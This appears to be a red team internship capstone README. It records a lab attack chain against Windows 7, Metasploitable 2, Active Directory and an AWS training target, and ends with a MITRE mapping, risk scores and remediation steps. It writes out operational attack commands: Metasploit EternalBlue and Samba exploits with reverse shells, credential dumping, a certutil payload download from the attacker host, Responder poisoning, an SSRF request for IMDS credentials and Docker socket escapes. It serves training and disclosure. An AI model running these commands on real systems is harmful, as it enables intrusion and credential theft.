# 🔴 Cyberster Red Team Internship — Week 12 Capstone

<div align="center">

![Red Team](https://img.shields.io/badge/Track-Red%20Team%20%7C%20Offensive%20Security-red?style=for-the-badge&logo=kalilinux&logoColor=white)
![Status](https://img.shields.io/badge/Status-Completed-brightgreen?style=for-the-badge)
![Week](https://img.shields.io/badge/Week-12%20%7C%20Capstone-darkred?style=for-the-badge)
![MITRE](https://img.shields.io/badge/Framework-MITRE%20ATT%26CK-blue?style=for-the-badge)

**Full Cyber Kill Chain Attack Simulation — Windows · Linux · Active Directory · AWS Cloud**

*Submitted by: **Juraij Sadaqat** | Roll No: CSI-B1-617 | Cyberster Internship Batch 1*

</div>

---

## 📋 Table of Contents

- [Overview](#-overview)
- [Lab Environment](#-lab-environment)
- [Attack Phases — Kill Chain](#-attack-phases--kill-chain)
  - [Phase 1 — Reconnaissance](#phase-1--reconnaissance)
  - [Phase 2 — EternalBlue MS17-010 (Windows 7)](#phase-2--eternalblue-ms17-010-windows-7)
  - [Phase 3 — Credential Harvesting (Mimikatz)](#phase-3--credential-harvesting-mimikatz)
  - [Phase 4 — Samba Exploit (Metasploitable 2)](#phase-4--samba-exploit-metasploitable-2)
  - [Phase 5 — Linux Privilege Escalation (SUID + LinPEAS)](#phase-5--linux-privilege-escalation-suid--linpeas)
  - [Phase 6 — Windows Privilege Escalation (WinPEAS + CertUtil)](#phase-6--windows-privilege-escalation-winpeas--certutil)
  - [Phase 7 — Responder LLMNR Poisoning](#phase-7--responder-llmnr-poisoning)
  - [Phase 8 — Active Directory Lab (Windows Server 2012)](#phase-8--active-directory-lab-windows-server-2012)
  - [Phase 9 — Cloud Attack Chain (AWS S3 + SSRF + IAM + Docker)](#phase-9--cloud-attack-chain-aws-s3--ssrf--iam--docker)
- [MITRE ATT&CK Mapping](#-mitre-attck-mapping)
- [Risk Matrix & CVSS Scores](#-risk-matrix--cvss-scores)
- [Remediation Roadmap](#-remediation-roadmap)
- [12-Week Learning Journey](#-12-week-learning-journey)
- [Report](#-report)
- [Disclaimer](#-disclaimer)

---

## 🎯 Overview

This repository contains the **Week 12 Capstone Graduation Report** for the Cyberster Red Team Internship. The capstone consolidates all 12 weeks of offensive security training into a single, boardroom-ready penetration testing document.

It demonstrates a **complete end-to-end attack simulation** across Windows, Linux, and AWS Cloud environments — from initial reconnaissance to full system compromise — following the **Lockheed Martin Cyber Kill Chain** methodology and mapped to the **MITRE ATT&CK Framework**.

| Field | Details |
|---|---|
| **Student** | Juraij Sadaqat |
| **Roll No.** | CSI-B1-617 |
| **Track** | Red Team \| Offensive Security |
| **Duration** | 12 Weeks (3 Months) |
| **Submission** | May 24, 2026 |
| **Targets** | Windows 7 Pro, Metasploitable 2, Windows Server 2012, AWS Cloud |
| **Lab** | Oracle VirtualBox — Kali Linux Attacker Machine |
| **Tasks** | Task 01 · Task 02 · Task 03 · Task 04 |

---

## 🖥️ Lab Environment

All testing was conducted in a **fully isolated Oracle VirtualBox environment** — no production or internet-facing systems were involved.

| VM Name | OS | IP Address | Role | RAM |
|---|---|---|---|---|
| Kali Linux | Kali Linux x64 | 192.168.1.112 | Attacker Machine | 4096 MB |
| Windows 7 Pro (1) | Win 7 x64 SP1 | 192.168.1.187 | Primary Windows Target | 1024 MB |
| Windows 7 Pro (2) | Win 7 x64 SP1 | 192.168.1.188 | Secondary Windows Target | 1024 MB |
| Metasploitable 2 | Ubuntu Linux | 192.168.1.116 | Linux Vuln Target | 512 MB |
| metasploitable2 | Ubuntu Linux | 192.168.1.117 | Linux Vuln Target 2 | 512 MB |
| Windows Server 2012 | Win Server 2012 | 192.168.1.200 | AD Domain Controller | 2048 MB |
| AWS Cloud | PwnedLabs Platform | Cloud | Cloud Attack Target | — |

**Network:** Host-Only + Internal Network — fully isolated. Attacker hardened with UFW firewall (deny incoming, allow outgoing, SSH only).

---

## ⚔️ Attack Phases — Kill Chain

### Phase 1 — Reconnaissance

**Tool:** Nmap | **MITRE:** T1046 — Network Service Scanning

```bash
# Full service scan
nmap -sV -p- 192.168.1.187

# Targeted high-value port scan
nmap -sV -p 22,445,3389,5985 192.168.1.187
```

**Findings:** Port 445 (SMBv1) open — confirmed EternalBlue vulnerability. OS fingerprint: Windows 7 x64 Build 7600.

---

### Phase 2 — EternalBlue MS17-010 (Windows 7)

**CVE:** CVE-2017-0144 | **CVSS:** 9.3 Critical | **MITRE:** T1190

```bash
msfconsole
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.1.187
set LHOST 192.168.1.112
set payload windows/x64/meterpreter/reverse_tcp
run
```

**Result:** ✅ Meterpreter SYSTEM shell obtained on **both** Windows 7 targets (192.168.1.187 & 192.168.1.188). Unauthenticated RCE — no credentials required.

---

### Phase 3 — Credential Harvesting (Mimikatz)

**MITRE:** T1003.002 — OS Credential Dumping: SAM Database

```bash
meterpreter > lsa_dump_sam
meterpreter > creds_wdigest
meterpreter > search -f *.config
```

**Findings:**
- NTLM Hash extracted: `31d6cfe0d16ae931b73c59d7e0c089c0`
- SAM database fully dumped running as SYSTEM
- 162 sensitive `.config` files discovered (web.config, machine.config, ASP.NET)
- Pass-the-Hash attack possible — no password cracking required

---

### Phase 4 — Samba Exploit (Metasploitable 2)

**CVE:** CVE-2007-2447 | **CVSS:** 10.0 Critical | **MITRE:** T1190

```bash
use exploit/multi/samba/usermap_script
set RHOSTS 192.168.1.116
set LHOST 192.168.1.112
run
```

**Result:** ✅ Immediate root shell — no privilege escalation step required. `whoami = root` confirmed.

---

### Phase 5 — Linux Privilege Escalation (SUID + LinPEAS)

**MITRE:** T1548.001 — Abuse Elevation Control Mechanism: Setuid/Setgid

```bash
# SUID enumeration
find / -perm -u=s -type f 2>/dev/null

# Nmap SUID escape to root
nmap --interactive
nmap> !sh
whoami   # → root

# Automated enumeration
chmod +x linpeas.sh && ./linpeas.sh
```

**Result:** ✅ `www-data` → `root` via SUID nmap interactive mode. Instant root without any password.

---

### Phase 6 — Windows Privilege Escalation (WinPEAS + CertUtil)

**MITRE:** T1218.003 — Signed Binary Proxy Execution (LOLBAS)

```bash
# Attacker — host the file
python3 -m http.server 8000

# Target — download via trusted Windows binary (AV bypass)
certutil -urlcache -split -f http://192.168.1.112:8000/winPEASx64.exe winpeas.exe
winpeas.exe
```

**Result:** ✅ WinPEAS transferred and executed without AV detection. CertUtil LOLBAS technique bypasses application whitelisting.

---

### Phase 7 — Responder LLMNR Poisoning

**MITRE:** T1557.001 — LLMNR/NBT-NS Poisoning and SMB Relay

```bash
sudo responder -I eth0 -dwv

# Crack captured NTLMv2 hashes
hashcat -m 5600 captured_hash.txt rockyou.txt
```

**Result:** ✅ LLMNR/NBT-NS/MDNS poisoners active — any name resolution failure captures NTLMv2 credentials. No vulnerability required — abuses legitimate Windows behavior.

---

### Phase 8 — Active Directory Lab (Windows Server 2012)

**MITRE:** T1136.002 · T1069.002 · T1087.002

```powershell
Install-WindowsFeature AD-Domain-Services -IncludeManagementTools
```

**AD Attack Techniques Practiced:**

| Technique | Tool | MITRE ID | Impact |
|---|---|---|---|
| User Enumeration | PowerView Get-NetUser | T1087.002 | Account discovery |
| AS-REP Roasting | Impacket GetNPUsers | T1558.004 | Password hash theft |
| Kerberoasting | GetUserSPNs.py | T1558.003 | Offline hash cracking |
| BloodHound Mapping | SharpHound + BloodHound | T1069.002 | Attack path mapping |
| DCSync Attack | Mimikatz lsadump::dcsync | T1003.006 | All hash extraction |
| Golden Ticket | Mimikatz kerberos::golden | T1558.001 | Persistent DA access |

**Result:** ✅ Full Windows domain environment operational. SMBv1 intentionally enabled for attack simulation.

---

### Phase 9 — Cloud Attack Chain (AWS S3 + SSRF + IAM + Docker)

**MITRE:** T1530 · T1552.005 · T1078.004 · T1611

**Full Attack Chain:**

```
S3 Recon → Anonymous LIST → SSRF Discovery → IMDS Exploitation → IAM Enumeration → Docker Escape
```

```bash
# Step 1 — S3 Bucket Enumeration
aws s3 ls s3://huge-logistics-storage --no-sign-request
aws s3 ls s3://huge-logistics-storage/backup/ --no-sign-request

# Step 2 — SSRF → IMDS Credential Theft (via Burp Suite)
GET /status/status.php?name=169.254.169.254/latest/meta-data/iam/security-credentials/MetapwnedS3Access

# Step 3 — Configure stolen credentials
aws configure --profile ssrf
# [Enter stolen AccessKeyId, SecretKey, SessionToken]

# Step 4 — IAM Enumeration
aws sts get-caller-identity --profile ssrf
aws iam get-user --profile huge-logistics
aws iam list-user-policies --user-name dev01 --profile huge-logistics

# Step 5 — Docker Container Escape
docker run -it -v /var/run/docker.sock:/var/run/docker.sock ubuntu bash
docker -H unix:///var/run/docker.sock run --rm -it --privileged --pid=host ubuntu nsenter -t 1 -m -u -n -i sh
```

**Findings:**

| Step | Attack | Finding | Impact |
|---|---|---|---|
| 1 | S3 Discovery | `huge-logistics-storage` bucket public LIST | Sensitive files exposed |
| 2 | Anonymous LIST | `/backup/` accessible without credentials | Config + DB backups leaked |
| 3 | SSRF | `status.php?name=` parameter vulnerable | Server-side request forgery |
| 4 | IMDS | `169.254.169.254` queried via SSRF | IAM STS credentials stolen |
| 5 | IAM Enum | `dev01` user, `S3Access` inline policy | Privilege escalation path |
| 6 | Role Discovery | `BackendDev` role ARN found | Lateral movement path |
| 7 | Docker Escape | `--privileged` + `/var/run/docker.sock` | Host OS access gained |

**Result:** ✅ Complete cloud account compromise from a single SSRF vulnerability. AWS Account `104506445608` fully accessed.

---

## 🗺️ MITRE ATT&CK Mapping

| Tactic | Technique ID | Technique | Tool |
|---|---|---|---|
| Reconnaissance | T1046 | Network Service Scanning | Nmap -sV |
| Initial Access | T1190 | Exploit Public-Facing Application | Metasploit EternalBlue |
| Initial Access | T1190 | Exploit Public-Facing Application | Metasploit Samba |
| Execution | T1059.003 | Windows Command Shell | Meterpreter shell |
| Privilege Escalation | T1548.001 | SUID/SGID Abuse | nmap --interactive !sh |
| Privilege Escalation | T1068 | Exploitation for Priv Esc | WinPEAS enumeration |
| Credential Access | T1003.002 | SAM Database Dump | Mimikatz lsa_dump_sam |
| Credential Access | T1557.001 | LLMNR/NBT-NS Poisoning | Responder -I eth0 |
| Defense Evasion | T1218.003 | Signed Binary Proxy Execution | certutil -urlcache |
| Collection | T1530 | Data from Cloud Storage | AWS CLI S3 enumeration |
| Credential Access | T1552.005 | Cloud Instance Metadata | SSRF → IMDS exploit |
| Privilege Escalation | T1611 | Escape to Host | Docker --privileged socket |
| Defense Evasion | T1078.004 | Valid Cloud Accounts | Stolen IAM credentials |

---

## 📊 Risk Matrix & CVSS Scores

| Finding | CVE | CVSS | Severity | System |
|---|---|---|---|---|
| MS17-010 EternalBlue | CVE-2017-0144 | 9.3 | 🔴 Critical | Windows 7 x2 |
| Samba Usermap RCE | CVE-2007-2447 | 10.0 | 🔴 Critical | Metasploitable 2 |
| SSRF → IMDS Credentials | — | 9.1 | 🔴 Critical | AWS EC2 |
| Docker Privileged Escape | — | 8.8 | 🔴 Critical | Docker Host |
| SAM Database Dump | — | 8.1 | 🟠 High | Windows 7 |
| SUID Nmap Escalation | — | 7.8 | 🟠 High | Metasploitable |
| S3 Public Bucket | — | 7.5 | 🟠 High | AWS S3 |
| LLMNR/NBT-NS Poisoning | — | 7.5 | 🟠 High | Network |
| Privileged Container | — | 7.0 | 🟠 High | AWS IAM |
| CertUtil LOLBAS | — | 6.5 | 🟡 Medium | Windows 7 |

**Summary:** 4 Critical · 5 High · 1 Medium · 0 Low

---

## 🛡️ Remediation Roadmap

### 🔴 Phase 1 — Immediate (0–30 Days)

```powershell
# 1. Disable SMBv1 — patch EternalBlue
Set-SmbServerConfiguration -EnableSMB1Protocol $false

# 2. Enforce AWS IMDSv2 — block SSRF-based IMDS attacks
aws ec2 modify-instance-metadata-options \
  --instance-id <id> --http-tokens required

# 3. Block S3 Public Access
aws s3control put-public-access-block \
  --public-access-block-configuration \
  BlockPublicAcls=true,BlockPublicPolicy=true

# 4. Disable LLMNR via GPO
# Computer Config → Admin Templates → Network → DNS Client
# "Turn off multicast name resolution" = Enabled
```

### 🟠 Phase 2 — Short-Term (30–90 Days)

- **IAM Least Privilege** — Audit all IAM users with AWS IAM Access Analyzer. Remove inline policies. Rotate access keys. Enable MFA.
- **Docker Hardening** — Remove `--privileged` flag. Mount Docker socket read-only only where required. Deploy Falco runtime security.
- **Fix SUID Binaries** — `find / -perm -u=s -type f 2>/dev/null` on all Linux systems. Remove unnecessary SUID bits: `chmod u-s /usr/bin/nmap`.
- **SIEM Deployment** — Windows Event Log forwarding (IDs: 4624, 4625, 4672, 4688). Suricata IDS with EternalBlue signatures.

### 🟡 Phase 3 — Long-Term (90+ Days)

- **Windows OS Upgrade** — Windows 7 reached End of Life in January 2020. Migrate to Windows 10/11 or Windows Server 2022.
- **Zero Trust Architecture** — Microsoft Entra ID (Azure AD), Conditional Access, Privileged Identity Management (PIM), network micro-segmentation.
- **Quarterly Red Team Assessments** — Continuous validation of security controls. Mandatory security awareness training. Tabletop exercises.

---

## 📅 12-Week Learning Journey

<details>
<summary><b>Month 1 — Weeks 1–4: Foundations, Recon & Web Security</b></summary>

| Week | Topic | Key Tools |
|---|---|---|
| Week 01 | Advanced Recon & OSINT | Subfinder, Amass, DNSDumpster, Gowitness, Google Dorking |
| Week 02 | Network Enumeration | Nmap (stealth scans, NSE scripts), Enum4linux, smbclient |
| Week 03 | Vulnerability Assessment & First Shell | Metasploit, Searchsploit, ffuf, WPScan, Netcat |
| Week 04 | Web App PenTest (OWASP Top 10) | Burp Suite, sqlmap, DVWA, Juice Shop |

</details>

<details>
<summary><b>Month 2 — Weeks 5–8: Post-Exploitation, AD & Domain Dominance</b></summary>

| Week | Topic | Key Tools |
|---|---|---|
| Week 05 | Post-Exploitation & Privilege Escalation | LinPEAS, WinPEAS, SUID abuse, cron exploitation |
| Week 06 | Lateral Movement & Pivoting | Chisel, Proxychains, Mimikatz, Pass-the-Hash, Evil-WinRM |
| Week 07 | Active Directory Enumeration & Kerberos | PowerView, BloodHound, AS-REP Roasting, Kerberoasting |
| Week 08 | AD Dominance & Persistence | DCSync, Golden Ticket, Silver Ticket, NTDS.dit extraction |

</details>

<details>
<summary><b>Month 3 — Weeks 9–12: Evasion, C2, Cloud & Capstone</b></summary>

| Week | Topic | Key Tools |
|---|---|---|
| Week 09 | AV/EDR Evasion & LOLBAS | MSFVenom encoders, AMSI bypass, Invoke-Obfuscation, CertUtil |
| Week 10 | C2 Frameworks & Phishing | Sliver C2, Havoc C2, GoPhish, HTML Smuggling |
| Week 11 | Cloud Security (AWS) | S3Scanner, AWS CLI, Burp Suite SSRF, Docker escape |
| Week 12 | **Capstone — Full Kill Chain** | **All tools — complete multi-environment simulation** |

</details>

---

## 📄 Report

The full Capstone Graduation Report (`Week12_Capstone_v_JuraijSadaqat.pdf`) is included in this repository. It covers:

- ✅ **Task 01** — Pre-Engagement: Lab Setup, Firewall Hardening, Rules of Engagement
- ✅ **Task 02** — Cyber Kill Chain Execution (9 Phases, 4 Environments)
- ✅ **Task 03** — Post-Engagement Cleanup & Verification
- ✅ **Task 04** — Boardroom Final Report (Executive Summary, Risk Matrix, MITRE ATT&CK Mapping, Remediation Roadmap)

📥 **[Download PDF Report](./Week12_Capstone_v_JuraijSadaqat.pdf)**

---

## ⚠️ Disclaimer

> **ALL penetration testing activities documented in this repository were conducted exclusively in authorized, isolated lab environments using Oracle VirtualBox.**
>
> - No unauthorized systems were accessed at any point during this engagement.
> - All targets (Windows 7, Metasploitable 2, Windows Server 2012, AWS PwnedLabs) are intentionally vulnerable lab machines designed for security training.
> - This report is submitted as an academic capstone deliverable for the Cyberster Red Team Internship (Batch 1, CSI-B1).
> - All findings have been responsibly disclosed within the scope of the training program.
> - The techniques documented here are for **educational and authorized security testing purposes only**. Unauthorized use against real systems is illegal and unethical.

---

<div align="center">

**Juraij Sadaqat** | Roll No: CSI-B1-617 | Red Team Track | Cyberster Internship Batch 1 | May 2026

![Kali](https://img.shields.io/badge/Kali_Linux-557C94?style=flat&logo=kalilinux&logoColor=white)
![Metasploit](https://img.shields.io/badge/Metasploit-2596CD?style=flat&logo=metasploit&logoColor=white)
![AWS](https://img.shields.io/badge/AWS-FF9900?style=flat&logo=amazonaws&logoColor=white)
![Docker](https://img.shields.io/badge/Docker-2496ED?style=flat&logo=docker&logoColor=white)
![MITRE](https://img.shields.io/badge/MITRE_ATT%26CK-005B94?style=flat)

*"The Report is the Product — technical execution without professional documentation has no value."*

</div>
